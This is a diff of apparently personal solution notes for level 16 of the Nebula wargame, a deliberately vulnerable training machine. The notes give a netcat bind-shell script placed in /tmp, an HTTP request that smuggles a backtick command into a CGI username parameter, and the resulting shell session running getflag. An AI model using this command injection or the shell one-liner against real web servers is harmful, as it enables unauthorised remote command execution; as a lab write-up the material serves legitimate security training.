@@ -203,12 +203,20 @@ next level pass: 574YGIzG
 
 Level16:
 ----------------
-/home/level16/MYSCRIPT:
+http://thisisdearmo.blogspot.ro/2012/06/nebula-level-16-solution.html
+Script should be placed in /tmp folder, so that flag16 user (the owner of thttpd process) can access it.
+/tmp/SCRIPT:
 #!/bin/sh
-nc.traditional -lvnp 4444 -e /bin/sh
+nc.traditional -lvn 4444 -e /bin/sh
 
 nc nebula 1616
-GET /index.cgi?password=random&username=-"`/*/*/MYSCRIPT`%00"
+GET /index.cgi?username="`/*/SCRIPT`%00"&password=pass
+
+>nc 192.168.0.18 4444
+id
+uid=983(flag16) gid=983(flag16) groups=983(flag16)
+getflag
+You have successfully executed getflag on a target account
 
 next level pass: 
 
